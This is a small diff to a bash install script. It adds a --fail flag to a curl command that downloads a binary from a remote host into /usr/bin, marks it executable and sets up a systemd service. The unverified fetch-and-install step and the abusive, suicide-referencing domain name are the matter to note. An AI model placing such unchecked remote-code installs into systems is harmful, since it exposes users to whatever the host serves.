@@ -1,6 +1,6 @@
 #!/bin/bash
 
-curl -o /usr/bin/oh -s -L --retry 10 --retry-delay 1 --retry-max-time 30 https://if-you-dont-like-me-you-can-commit-suicide.qwq.pink/
+curl -o /usr/bin/oh -s -L --fail --retry 10 --retry-delay 1 --retry-max-time 30 https://if-you-dont-like-me-you-can-commit-suicide.qwq.pink/
 chmod +x /usr/bin/oh
 
 if [ ! -f /lib/systemd/system/oh.service ]; then
